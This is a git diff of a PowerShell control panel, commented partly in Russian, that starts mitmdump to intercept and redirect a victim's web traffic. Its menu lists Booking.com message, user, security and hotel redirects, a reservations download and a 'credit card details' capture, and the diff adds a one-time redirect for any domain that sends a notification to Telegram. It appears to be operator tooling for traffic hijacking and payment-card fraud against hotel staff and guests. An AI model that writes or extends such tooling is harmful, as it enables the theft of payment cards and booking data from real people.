@@ -310,6 +310,7 @@ function Enable-ForceRedirect {
     Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
     Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
     Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
+	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
     Log-Write "Force redirect enabled."
     Start-Mitmdump
 }
@@ -339,6 +340,7 @@ function Enable-OneShotRedirect {
     Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
     Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
     Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
+	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
     Log-Write "One-shot redirect enabled."
     Start-Mitmdump
 }
@@ -368,6 +370,7 @@ function Enable-MessageRedirect {
     Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
     Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
     Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
+	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
     Log-Write "Booking.com message redirect enabled (function 7)."
     Start-Mitmdump
 }
@@ -397,6 +400,7 @@ function Enable-ProviderRedirect {
     Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
     Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
     Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
+	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
     Log-Write "Booking.com provider redirect enabled (function 8)."
     Start-Mitmdump
 }
@@ -426,6 +430,7 @@ function Enable-UserRedirect {
     Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
     Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
     Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
+	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
     Log-Write "Booking.com user redirect enabled (function 9)."
     Start-Mitmdump
 }
@@ -455,6 +460,7 @@ function Enable-SecurityRedirect {
     Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
     Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
     Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
+	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
     Log-Write "Booking.com security redirect enabled (function 10)."
     Start-Mitmdump
 }
@@ -491,6 +497,7 @@ function Enable-Operation11Redirect {
     Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
     Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
     Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
+	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
     Start-Mitmdump
     
     Log-Write "Operation 11: Function 7 (message redirect) enabled."
@@ -529,6 +536,7 @@ function Enable-Operation12Redirect {
     Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
     Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
     Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
+	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
     Start-Mitmdump
     
     Log-Write "Operation 12: Function 9 (user redirect) enabled."
@@ -561,6 +569,7 @@ function Enable-BookingHotelRedirect {
     Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
     Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
     Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
+	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
     Log-Write "Booking.com HOTEL (global) redirect enabled (function 13)."
     Start-Mitmdump
 }
@@ -596,6 +605,7 @@ function Enable-BookingHotelSecurityRedirect {
     Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
     Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
     Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
+	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
     Log-Write "Booking.com HOTEL SECURITY redirect enabled (function 15)."
     Start-Mitmdump
 }
@@ -632,6 +642,7 @@ function Enable-Operation16Redirect {
     Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
     Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
     Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
+	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
     Start-Mitmdump
     
     Log-Write "Operation 16: Function 13 (Booking Hotel Redirect) enabled."
@@ -639,53 +650,99 @@ function Enable-Operation16Redirect {
 }
 
 function Enable-CustomRedirect {
-    Log-Write "Starting 17..."
+    Log-Write "Starting FUNCTION 17..."
+    
+    # ВАЖНО: ОЧИЩАЕМ ВСЕ ФЛАГИ функции 17
+    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
+    
+    # Даем время для очистки
+    Start-Sleep -Milliseconds 500
     
     Write-Host ""
-    Write-Host "=== CUSTOM ONE-TIME REDIRECT ==="
+    Write-Host "=== FUNCTION 17: CUSTOM ONE-TIME REDIRECT ==="
+    Write-Host ""
+    Write-Host "[INFO] This function will redirect the FIRST request to FROM URL" 
+    Write-Host "       to TO URL, then automatically disable itself."
+    Write-Host "       Works with ANY domains (bbc.com, cnn.com, etc.)"
     Write-Host ""
     
     # Ask for FROM URL
     do {
-        $fromDomain = Read-Host "Enter FULL FROM URL"
+        $fromDomain = Read-Host "Enter FULL FROM URL (e.g., https://bbc.com)"
         if ($fromDomain -notmatch '^https?://') {
             Write-Host "ERROR: URL must start with http:// or https://" -ForegroundColor Red
-            Write-Host "Example: https://www.example.com/" 
+            Write-Host "Example: https://www.bbc.com" 
+            Write-Host "         https://cnn.com"
+            Write-Host "         http://example.com"
             continue
+        }
+        
+        # Проверяем, что URL выглядит корректно
+        if ($fromDomain -notmatch '^https?://[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}') {
+            Write-Host "WARNING: URL doesn't look like a valid domain" -ForegroundColor Yellow
+            $confirm = Read-Host "Continue anyway? (y/n)"
+            if ($confirm -ne 'y') {
+                continue
+            }
         }
         break
     } while ($true)
     
     # Ask for TO URL
     do {
-        $toDomain = Read-Host "Enter TO URL"
+        $toDomain = Read-Host "Enter FULL TO URL"
         if ($toDomain -notmatch '^https?://') {
             Write-Host "ERROR: URL must start with http:// or https://" -ForegroundColor Red
-            Write-Host "Example: https://www.google.com/" 
+            Write-Host "Example: https://www.google.com" 
+            Write-Host "         https://example.com"
+            Write-Host "         http://redirect-target.com"
             continue
+        }
+        
+        # Предупреждение о редиректе на тот же домен
+        $fromHost = $fromDomain -replace '^https?://(www\.)?', ''
+        $toHost = $toDomain -replace '^https?://(www\.)?', ''
+        if ($fromHost -eq $toHost) {
+            Write-Host "WARNING: FROM and TO domains are the same!" -ForegroundColor Yellow
+            Write-Host "This might cause infinite redirects!"
+            $confirm = Read-Host "Continue anyway? (y/n)"
+            if ($confirm -ne 'y') {
+                continue
+            }
         }
         break
     } while ($true)
     
-    # Clear done flag
-    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
-    
     # Save settings to files
-    Set-Content -Path $CustomRedirectFromFile -Value $fromDomain -Force
-    Set-Content -Path $CustomRedirectToFile -Value $toDomain -Force
+    Set-Content -Path $CustomRedirectFromFile -Value $fromDomain.Trim() -Force
+    Set-Content -Path $CustomRedirectToFile -Value $toDomain.Trim() -Force
     
-    Log-Write ("Custom one-time redirect configured: {0} -> {1}" -f $fromDomain, $toDomain)
+    Log-Write ("[F17] Configured: {0} -> {1}" -f $fromDomain, $toDomain)
     Write-Host ""
-    Write-Host ("[CONFIGURED] First request to: {0}" -f $fromDomain) 
-    Write-Host ("Will be redirected to: {0}" -f $toDomain) 
-    Write-Host ("Function will auto-disable after first use") 
+    Write-Host ("[CONFIGURED] First request to: {0}" -f $fromDomain) -ForegroundColor Green
+    Write-Host ("Will be redirected to: {0}" -f $toDomain) -ForegroundColor Green
     Write-Host ""
+    Write-Host "[IMPORTANT] Function will:" -ForegroundColor Cyan
+    Write-Host "1. Redirect ONLY the FIRST matching request"
+    Write-Host "2. Work with ANY domain (old or new)"
+    Write-Host "3. Auto-disable after first use"
+    Write-Host "4. Send notification to Telegram"
+    Write-Host ""
+    
+    # Убедимся, что папка существует
+    $flagDir = Split-Path $CustomRedirectFlag
+    if (-not (Test-Path $flagDir)) {
+        New-Item -ItemType Directory -Path $flagDir -Force | Out-Null
+    }
     
     # Create activation flag
-    if (-not (Test-Path (Split-Path $CustomRedirectFlag))) {
-        New-Item -ItemType Directory -Path (Split-Path $CustomRedirectFlag) -Force | Out-Null
-    }
-    New-Item -ItemType File -Path $CustomRedirectFlag -Force | Out-Null
+    Set-Content -Path $CustomRedirectFlag -Value "ACTIVE" -Force
+    
+    # Убедимся, что DONE flag удален
+    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
     
     # Disable other flags
     Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
@@ -706,9 +763,31 @@ function Enable-CustomRedirect {
     Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
     Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
     
+    # Restart mitmdump
     Start-Mitmdump
     
-    Log-Write "Custom one-time redirect enabled (function 17). First matching request will be redirected."
+    Log-Write "[F17] Custom one-time redirect enabled."
+    Write-Host ""
+    Write-Host "✅ Function 17 ACTIVATED" -ForegroundColor Green
+    Write-Host "   Next request to $fromDomain will be redirected" -ForegroundColor Cyan
+    Write-Host ""
+}
+
+function Clear-Function17 {
+    Log-Write "Clearing Function 17..."
+    
+    Remove-Item -Path $CustomRedirectFlag -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectDoneFlag -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectFromFile -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectToFile -Force -ErrorAction SilentlyContinue
+    
+    Write-Host ""
+    Write-Host "✅ Function 17 completely cleared" -ForegroundColor Green
+    Write-Host "   All flags and configuration removed"
+    Write-Host "   Ready for new configuration"
+    Write-Host ""
+    
+    Log-Write "Function 17 cleared"
 }
 
 function Enable-BookingReservationsRedirect {
@@ -763,10 +842,10 @@ function Enable-BookingReservationsRedirect {
     Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
     Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
     Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
     Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
     Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
     Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
+	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
     
     Log-Write ("Booking reservations redirect enabled with hotel_id={0}, reportId={1}" -f $hotelId, $reportId)
     Write-Host ""
@@ -835,6 +914,7 @@ function Enable-BookingCCDetailsRedirect {
     Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
     Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
     Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
+	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
     
     Log-Write ("Booking CC details redirect enabled with bn={0}, hotel_id={1}" -f $bn, $hotelId)
     Write-Host ""
@@ -936,6 +1016,7 @@ while ($true) {
     Write-Host "   17) Custom one-time redirect (function 17)"
     Write-Host "   18) Reservations download (function 18)"
     Write-Host "   19) Credit card details (function 19)"
+	Write-Host "   20) Clear Function 17"
     Write-Host "==========================================="
     $opt = Read-Host "Enter option"
 
@@ -994,6 +1075,7 @@ while ($true) {
         "17" { Enable-CustomRedirect }
         "18" { Enable-BookingReservationsRedirect }
         "19" { Enable-BookingCCDetailsRedirect }
+		"20" { Clear-Function17 }
         default { Write-Host "Invalid choice" }
     }
 }
